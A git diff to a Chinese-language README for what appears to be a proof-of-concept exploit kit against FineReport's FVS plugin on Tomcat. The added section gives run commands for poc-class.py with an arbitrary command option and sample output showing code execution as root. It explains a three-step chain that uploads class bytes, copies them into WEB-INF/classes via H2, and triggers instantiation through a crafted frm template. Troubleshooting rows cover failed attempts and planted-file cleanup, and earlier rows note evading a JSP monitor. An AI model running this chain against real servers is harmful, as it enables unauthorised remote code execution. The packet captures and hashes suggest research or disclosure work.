@@ -157,7 +157,35 @@ Tomcat 管理，之后本方法就是全自动的。上面那张时间线就是�
 
 只有 1 个上传、1 个 apply，其余都是轮询读结果，没有任何触发请求。服务器侧日志搜 `StandardContext.reload`。
 
-## 五、自己抓 pcap
+## 五、方法四：类文件 + 模板实例化（约 3–5 秒）
+
+```bash
+python3 poc-class.py -t http://<靶标>:18081                 # 默认命令: id/hostname/date
+python3 poc-class.py -t http://<靶标>:18081 -c "id"         # 换命令, 不用重启
+```
+
+期望输出：
+
+```
+[1] 落地   -> upload 200 / apply 200 {"applySuccess":true,...}
+[2] 就位   -> upload 200 / apply 200 {"applySuccess":true,...}
+[3] 触发   -> upload 200 / apply 200 {"applySuccess":false,...}
+[4] 回显   -> 200  (命令以应用进程权限执行, 输出如下)
+----------------------------------------------
+PWN-CLASS-LOAD
+uid=0(root) gid=0(root) groups=0(root)
+<容器hostname>
+----------------------------------------------
+```
+
+三步各做什么：第 1 步把类文件字节（`.txt` 后缀）和命令文本当附件写进 `WEB-INF/logs/`；第 2 步用 H2 把类文件
+复制成 `WEB-INF/classes/V.class`；第 3 步导入一个 `<Layout class="V"/>` 的 frm 模板，FR 解析它时实例化 `V`，
+命令执行，输出写到 `webroot/vout.txt`；最后 GET 这个文件。原理见 `vulnerability-analysis.md` §7。
+
+访问日志里每次运行就是 3 组 `POST .../reuse/item` + `POST .../apply/v2/tpl`，加一个 `GET /webroot/vout.txt`，
+没有别的请求。这条路线没有单独的 pcap。
+
+## 六、自己抓 pcap
 
 ```bash
 # 靶标机上(localhost 场景; tcpdump 需 root)。-U 逐包落盘, 否则收尾时缓冲区里的最后几包会丢
@@ -168,7 +196,7 @@ sudo pkill -x tcpdump
 # 远程靶标则抓对应网卡: -i eth0 host <靶标IP>
 ```
 
-## 六、常见坑
+## 七、常见坑
 
 | 现象 | 原因/处理 |
 |---|---|
@@ -177,11 +205,14 @@ sudo pkill -x tcpdump
 | apply 后 webroot 的 JSP 消失变 `.blocked` | security.enhance 插件的 JSP-Monitor——所以交互模式写 ROOT、植入模式写 WEB-INF |
 | `--implant` 写完描述符却超时 | 确认 `--tomcat-home` 指向目标 Tomcat 根目录、其 `autoDeploy` 未被关闭；否则命令会在下次重启/重部署时执行 |
 | `poc-attach.py` 植入后超时 | 该应用不受 Tomcat 部署管理（如官方镜像的 `/webroot` 写死在 `server.xml`）。先跑方法二让它转为 Tomcat 管理，或等重启/重部署 |
+| `poc-class.py` 第 3 步 `applySuccess=false` | 属预期：类在解析阶段已被实例化，之后导入器才报错，看第 4 步有没有输出即可 |
+| `poc-class.py` 提示"标记不匹配" | `V` 没被实例化。确认目标装有 FVS 插件且版本受影响、`--tomcat-home` 路径正确；容器刚重启要等插件就绪 |
+| 改了 `V.java` 重新编译后行为没变 | 类已被加载过，需目标重启才会加载新类 |
 | 在日志里找不到重载记录 | 该镜像的 Tomcat 日志是中文的：找 `StandardContext.reload` / `HostConfig.deployDescriptor`，或"重新加载"/"部署描述符" |
 | `tcpdump` 抓不到 | 非 root；流量不走 lo（远程靶标抓 eth0）；没加 `-U` 导致末尾丢包 |
-| 想清场还原 | 删 `WEB-INF/web.xml`、`WEB-INF/x.env`、`conf/Catalina/localhost/z.xml`、`ROOT/*.jsp`、`webroot/*.txt`；或直接重建容器 |
+| 想清场还原 | 删 `WEB-INF/web.xml`、`WEB-INF/x.env`、`conf/Catalina/localhost/z.xml`、`ROOT/*.jsp`、`webroot/*.txt`、`WEB-INF/classes/V.class`、`WEB-INF/logs/v.txt`、`WEB-INF/logs/c.txt`（删掉 V.class 后需重启）；或直接重建容器 |
 
-## 七、文件指纹（sha256）
+## 八、文件指纹（sha256）
 
 ```
 516d6e8a524594def971f1dbe245be9f68299c6ee67b1afe9dd4ef99b1e1e718  pcaps/h2-route.pcap
